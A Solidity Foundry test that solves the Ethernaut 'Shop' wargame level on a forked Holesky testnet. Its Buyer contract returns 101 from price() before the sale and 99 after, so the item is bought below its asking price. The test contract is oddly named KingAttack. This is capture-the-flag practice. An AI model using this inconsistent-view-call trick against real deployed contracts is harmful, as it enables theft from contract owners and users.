// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Shop} from "../../src/Ethernaut/Shop.sol";

contract KingAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        Shop shop = Shop(0x6c7fEC1AC1A07f0c01f7CCd38B88444B78De427D);

        vm.startPrank(playerAddress);
        Buyer buyer = new Buyer();
        buyer.attack(shop);
        vm.stopPrank();

        assertTrue(shop.price() < 100 && shop.isSold());
    }
}

contract Buyer {
    uint256 private _price = 101;
    Shop shop;

    function attack(Shop _shop) public {
        shop = _shop;
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 99;
        } else {
            return 101;
        }
    }
}
